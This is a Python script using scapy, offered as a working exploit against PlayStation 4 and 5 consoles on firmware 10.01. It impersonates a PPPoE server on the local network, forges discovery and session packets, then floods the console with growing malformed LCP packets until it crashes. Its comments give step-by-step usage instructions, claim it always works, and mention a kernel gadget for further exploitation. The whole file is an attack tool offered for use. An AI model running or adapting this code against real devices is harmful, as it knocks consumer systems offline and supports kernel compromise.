from scapy.all import PPPoED, Ether, sniff, sendp, srp1, hexdump, get_if_hwaddr, conf
from manuf import manuf
import struct

# This exploit works 100% of the time and is perstitant, you can leave it running.
# It will automatically get src ip and dst ip
# Sometimes the pppoe client will send out random information (nothing useful)

# connect PC to ps4, ps5
# Setup lan connection with pppoe
# run the script after setting interface (ifconfig /all, or ip addr).
# restart playstation, or network test.
# Enjoy your reboot

# FW: 10.01
# need gadget from kernel dump

interface = "Realtek PCIe GbE Family Controller"

p = manuf.MacParser(update=False)
conf.verb = False

mac_address = get_if_hwaddr(interface)
mac_address_packed = struct.pack('!6B', *[int(byte, 16) for byte in mac_address.split(':')])

while True:
  success = False
  src_address = ""
  src_address_packed = b""
  manufacture = ""
  tag_value = ""

  print("Listening for incoming packets from Sony")

  while True:
    packet = sniff(iface=interface, filter="pppoed", count=1)
  
    try:
      if Ether in packet[0]:
        src_address = packet[0][Ether].src
        src_address_packed = struct.pack('!6B', *[int(byte, 16) for byte in src_address.split(':')])

        manufacture = p.get_manuf_long(src_address)
        if "Sony" in manufacture: 
          tag_value = packet[PPPoED][0].tag_list[1].tag_value
          success = True
          break
    except:
      pass

  if (success == False): continue

  print(f"Got source address from playstation! [{src_address}] [{manufacture}] [{tag_value}]")

  payload = src_address_packed + mac_address_packed + b"\x88\x63\x11\x07\x00\x00\x00\x0c\x01\x03\x00\x08" + tag_value
  sendp(payload, iface=interface)

  print("Sent the PPPoE Discovery Request packet")

  packet = sniff(iface=interface, filter="pppoed", count=1)
  payload = src_address_packed + mac_address_packed + b"\x88\x63\x11\x65\x00\x01\x00\x0c\x01\x03\x00\x08" + tag_value
  sendp(payload, iface=interface)

  print("Sent the PPPoE Session Request Packet")

  packet = sniff(iface=interface, filter="pppoes", count=1)
  payload = src_address_packed + mac_address_packed + b"\x88\x64\x11\x00\x00\x01\x00\x09\xc0\x21\x01\x01\x00\x07\xab\xff"
  packet = srp1(Ether(payload), iface=interface)
  # i = 0

  # while True:
  #   i += 1
  #   packet = sniff(iface=interface, filter="pppoes", count=1)
  #   payload = src_address_packed + mac_address_packed + b"\x88\x64\x11\x00\x00\x01\x00\x09\xc0\x21\x01\x01\x00\x07\xab\xff" + b"\xFF" * i
  #   packet = srp1(Ether(payload), iface=interface, timeout=2)
  #   if not packet:
  #     print("Broke on " + str(i))
  #     break

  #   hexdump(packet)
  
  # exit(0)
  print("Sent the PPPoE Session Data Packet with Ethernet II Encapsulation")
  
  # in network test -> 249
  # in boot -> 22 (ssdp:discover)
  # in network test -> 26 (tCanShortCircuit)
  
  i = 0
  while True:
    i += 1

    sendp(src_address_packed + mac_address_packed + b"\x88\x64\x11\x00\x00\x01\x00\x09\xc0\x21\x01\x01\x00\x07\xab\xff" + b"\xff" * i, iface=interface)
    packet = sniff(iface=interface, filter="pppoes", count=1, timeout=5)

    if not packet:
      print("We crashed the system on payload " + str(i))
      break
    
    packet.hexdump()
